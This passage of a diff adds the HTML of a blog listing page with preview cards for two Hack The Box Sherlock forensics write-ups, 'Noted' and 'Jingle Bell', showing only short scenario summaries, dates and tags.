+            <a href="http://localhost:1313/posts/htb-sherlocks/noted/">HTB Sherlock Noted</a>
+        </h2>
+        <p class="date">
+            <span title='Date'> </span>
+    2024-05-16
+
+
+                | 
+                <span title='Tags'> </span>
+                
+                    <a href="/tags/dfir">#dfir</a>
+                
+                    <a href="/tags/file">#file</a>
+                
+                    <a href="/tags/htb">#htb</a>
+                
+                    <a href="/tags/noted">#noted</a>
+                
+                    <a href="/tags/notepad&#43;&#43;">#notepad&#43;&#43;</a>
+                
+                    <a href="/tags/sherlock">#sherlock</a>
+                
+                    <a href="/tags/time">#time</a>
+                
+                    <a href="/tags/windows">#windows</a>
+                
+            
+        </p>
+        
+            
+        
+        
+            <div class="articlePreview">
+                <p>
+                    
+                        Noted (DFIR) Scenario Simon, a developer working at Forela, notified the CERT team about a note that appeared on his desktop. The note claimed that his system had been compromised and that sensitive data from Simon&rsquo;s workstation had been collected.
+                    
+                </p>
+                <p><a href="http://localhost:1313/posts/htb-sherlocks/noted/">Continue reading </a></p>
+            </div>
+        
+    </div>
+    <hr />
+</article>
+<article class="card postlistitem">
+    <div>
+        <h2>
+            <a href="http://localhost:1313/posts/htb-sherlocks/jingle-bell/">HTB Sherlock Jingle Bell</a>
+        </h2>
+        <p class="date">
+            <span title='Date'> </span>
+    2024-05-16
+
+
+                | 
+                <span title='Tags'> </span>
+                
+                    <a href="/tags/bell">#bell</a>
+                
+                    <a href="/tags/database">#database</a>
+                
+                    <a href="/tags/dfir">#dfir</a>
+                
+                    <a href="/tags/htb">#htb</a>
+                
+                    <a href="/tags/jingle">#jingle</a>
+                
+                    <a href="/tags/notification">#notification</a>
+                
+                    <a href="/tags/push">#push</a>
+                
+                    <a href="/tags/sherlock">#sherlock</a>
+                
+                    <a href="/tags/windows">#windows</a>
+                
+                    <a href="/tags/wpndatabase">#wpndatabase</a>
+                
+            
+        </p>
+        
+            
+        
+        
+            <div class="articlePreview">
+                <p>
+                    
+                        Jingle Bell (DFIR) Scenario Torrin is suspected to be an insider threat in Forela. He is believed to have leaked some data and removed certain applications from their workstation. They managed to bypass some controls and installed unauthorized software.
+                    
+                </p>
+                <p><a href="http://localhost:1313/posts/htb-sherlocks/jingle-bell/">Continue reading </a></p>
+            </div>
+        
+    </div>
+    <hr />
+</article>
+
+            </div>
+        </div>
+    
+
+
+                    </main><footer>
+    <hr />
+
+<p><small>
+        2024 &copy; Shakil Hossain - All Right Reserved.
+    </small></p>
+    <p><small>
+        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
